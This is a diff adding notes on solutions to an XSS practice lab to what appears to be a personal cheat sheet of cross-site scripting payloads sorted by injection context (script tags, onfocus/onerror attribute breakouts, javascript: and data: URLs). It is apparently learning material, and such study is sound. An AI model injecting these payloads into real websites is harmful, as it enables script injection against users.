@@ -46,3 +46,9 @@ onerror=alert(1) <- adding an element with false link and generating alert in er
 5. javascript:alert(1);                                 // context -> within html tags ( a attributes )
 6. data:text/javascript,alert('XSS') or data:text/plain,alert(1)     // context -> within html tags ( script src tag ), loading files dynamically via url
 -------------------------------------------------------------------------------------
+[+] XSS Labs (at https://xss-labs.abay.sh/xss/ ) solution - # self solved
+1. <script>alert(1)</script>                                   // context -> within html
+2. x" autofocus onfocus="alert(1)                              // context -> within html tags ( input box placeholder ) [ btw it broke page to continuously load and show popups infinitely ]
+   x" onfocus="alert(1) -> also works 
+3. 
+
